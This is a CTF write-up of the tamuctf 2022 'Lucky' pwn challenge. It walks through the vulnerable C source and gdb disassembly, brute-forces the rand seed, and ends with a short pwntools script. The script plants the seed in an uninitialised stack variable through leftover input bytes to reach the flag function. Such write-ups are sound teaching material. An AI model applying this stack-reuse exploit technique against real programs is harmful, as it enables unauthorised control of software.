---
title: "tamuctf 2022 - Lucky"
date: 2022-4-20 00:00:00 +/-0500
categories: [Cybersecurity, CTFs]
tags: [ctf, tamuctf, pwn, cybersecurity] 
---

# tamuctf 2022: Lucky

Author: nhwn

Feeling lucky? I have just the challenge for you :D

## Reference

I could not solve this on my own so I had to refer to this writeup:

[https://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf/lucky](https://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf/lucky)


```c
#include <stdio.h>
#include <stdlib.h>

void welcome() {
    char buf[16];
    printf("Enter your name: ");
    fgets(buf, sizeof(buf), stdin);
    printf("\nWelcome, %s\nIf you're super lucky, you might get a flag! ", buf);
}

int seed() {
    char msg[] = "GLHF :D";
    printf("%s\n", msg);
    int lol;
    return lol;
}

void win() {
    char flag[64] = {0};
    FILE* f = fopen("flag.txt", "r");
    fread(flag, 1, sizeof(flag), f);
    printf("Nice work! Here's the flag: %s\n", flag);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    welcome();
    srand(seed());

    int key0 = rand() == 306291429;
    int key1 = rand() == 442612432;
    int key2 = rand() == 110107425;

    if (key0 && key1 && key2) {
        win();
    } else {
        printf("Looks like you weren't lucky enough. Better luck next time!\n");
    }
}
```

In `welcome()` function, before `fgets` gets called, `rbp-0x10` which is the address
to `buf` is loaded into `rax`. I passed in `aaaabaaacaaadaaaeaaafaaag`, the
buffer was filled with `aaaabaaacaaadaa\0`. 

```assembly
Dump of assembler code for function welcome:
   0x00005555555551a5 <+0>:	push   rbp
   0x00005555555551a6 <+1>:	mov    rbp,rsp
   0x00005555555551a9 <+4>:	sub    rsp,0x10 # grow stack by 16 bytes
   0x00005555555551ad <+8>:	lea    rdi,[rip+0xe54]        # 0x555555556008
   0x00005555555551b4 <+15>:	mov    eax,0x0
   0x00005555555551b9 <+20>:	call   0x555555555050 <printf@plt>
   0x00005555555551be <+25>:	mov    rdx,QWORD PTR [rip+0x2ebb]        # 0x555555558080 <stdin@@GLIBC_2.2.5>
   0x00005555555551c5 <+32>:	lea    rax,[rbp-0x10] 
   0x00005555555551c9 <+36>:	mov    esi,0x10 
   0x00005555555551ce <+41>:	mov    rdi,rax
   0x00005555555551d1 <+44>:	call   0x555555555070 <fgets@plt>
   # rbp-0x10 which is 0x7fffffffe160 points to the start of the string input
   # from the command line aaaabaaacaaadaa
=> 0x00005555555551d6 <+49>:	lea    rax,[rbp-0x10]
   0x00005555555551da <+53>:	mov    rsi,rax # put the result as the second
                                             # argument to printf
   0x00005555555551dd <+56>:	lea    rdi,[rip+0xe3c]        # 0x555555556020
   # rdi has the whole string that gets printed to the screen
   0x00005555555551e4 <+63>:	mov    eax,0x0
   0x00005555555551e9 <+68>:	call   0x555555555050 <printf@plt>
   # once printf gets called, the string now contains the buf 
   0x00005555555551ee <+73>:	nop
   0x00005555555551ef <+74>:	leave
   0x00005555555551f0 <+75>:	ret
```

When I printed out info frame for welcome function, it gave me:
```
Stack level 0, frame at 0x7fffffffe180:
 rip = 0x5555555551b4 in welcome; saved rip = 0x5555555552df
 called by frame at 0x7fffffffe1a0
 Arglist at 0x7fffffffe170, args:
 Locals at 0x7fffffffe170, Previous frame's sp is 0x7fffffffe180
 Saved registers:
  rbp at 0x7fffffffe170, rip at 0x7fffffffe178
```

So, the base pointer is at 170. Once fgets returns, its return values goes into
`rax` and `rax` has 15 bytes of characters `aaaabaaacaaadaa` and one bye of null
character. When the flow returns to the main function before calling `seed`
function, `rsi` still has the output that was used by the welcome function
(later I figured this didn't really matter).

```assembly
Dump of assembler code for function seed:
   0x00005555555551f1 <+0>:	push   rbp
   0x00005555555551f2 <+1>:	mov    rbp,rsp
   0x00005555555551f5 <+4>:	sub    rsp,0x10
   0x00005555555551f9 <+8>:	movabs rax,0x443a2046484c47
   0x0000555555555203 <+18>:	mov    QWORD PTR [rbp-0xc],rax
   0x0000555555555207 <+22>:	lea    rax,[rbp-0xc]
   # this instruction overwrites some of the characters of aaaabaaacaaadaa
   # so, before, it was:
   # 0x7fffffffe160:	0x61	0x61	0x61	0x61	0x62	0x61	0x61	0x61
   # 0x7fffffffe168:	0x63	0x61	0x61	0x61	0x64	0x61	0x61	0x00
   # but after:
   # 0x7fffffffe160:	0x61	0x61	0x61	0x61	0x47	0x4c	0x48	0x46
   # 0x7fffffffe168:	0x20	0x3a	0x44	0x00	0x64	0x61	0x61	0x00

   0x000055555555520b <+26>:	mov    rdi,rax
   0x000055555555520e <+29>:	call   0x555555555030 <puts@plt>
   # printf is replaced with puts by the compiler
   0x0000555555555213 <+34>:	mov    eax,DWORD PTR [rbp-0x4]
   # this is where eax contains the return value of `lol` variable
   # rbp is 0x7fffffffe170 and subtracting 4 bytes gives us 
   # 0x7fffffffe16c which I belive the start of `int lol` variable
   # if you examine the next four bytes from 0x7fffffffe16c, you can see
   # 0x7fffffffe16c:	0x64	0x61	0x61	0x00
   # this is 'daa' which is the last three characters from the stdin we entered
   earlier
   # (of course, this is shown with the little-endian format)
   # now we know that we can try to manipulate these four bytes with the value
   # that would make the condition satisfy so it would execute the win func
   
=> 0x0000555555555216 <+37>:	leave
   0x0000555555555217 <+38>:	ret
```

Since `srand()` is dictated by the return value of `seed()`, we would want to
overwrite/manipulate the return value of `seed()` somehow.

When seed() is being called and run, rsp ~ rsp+16 bytes still has some of the
leftover strings from the win function and `GLHF :D`. 

```
pwndbg> x/16cb $rsp
0x7fffffffe160:	97 'a'	97 'a'	97 'a'	97 'a'	71 'G'	76 'L'	72 'H'	70 'F'
0x7fffffffe168:	32 ' '	58 ':'	68 'D'	0 '\000'	100 'd'	97 'a'	97 'a'	0 '\000'
```

And, again, before the seed function returns, eax has `0x616164` which is `daa`
in little-endian format. 

Now, we need to know the seed value that will satisfy the if condition to
execute the win function.

```
    int key0 = rand() == 306291429;
    int key1 = rand() == 442612432;
    int key2 = rand() == 110107425;

    if (key0 && key1 && key2) {
        win();
    }
```


```c
 int i = 0;

  while (1) {

    srand(i);
    int key0 = rand() == 306291429;
    int key1 = rand() == 442612432;
    int key2 = rand() == 110107425;

    if (key0 && key1 && key2) {
      printf("seed = %i", i);
      exit(0);
    } else {
      i++;
    }

```

After running the program, we know that the seed value must be `5649426`. And we
know `daa` is where we need to put the seed value in.

12 bytes of string + 5649426

We can create a short python script that does this for us.

```
import pwn

elf = pwn.context.binary = pwn.ELF("./lucky")

#p = pwn.remote("tamuctf.com", 433, ssl=True, sni="lucky")

p = pwn.process(["./lucky"])

payload = b'A'*12
payload += pwn.p64(5649426)

p.sendline(payload)
p.interactive()
```

Result:

```
[+] Starting local process './lucky': pid 132488
[*] Switching to interactive mode
[*] Process './lucky' stopped with exit code 0 (pid 132488)
Enter your name:
Welcome, AAAAAAAAAAAA\x12V
If you're super lucky, you might get a flag! GLHF :D
Nice work! Here's the flag: flag
```

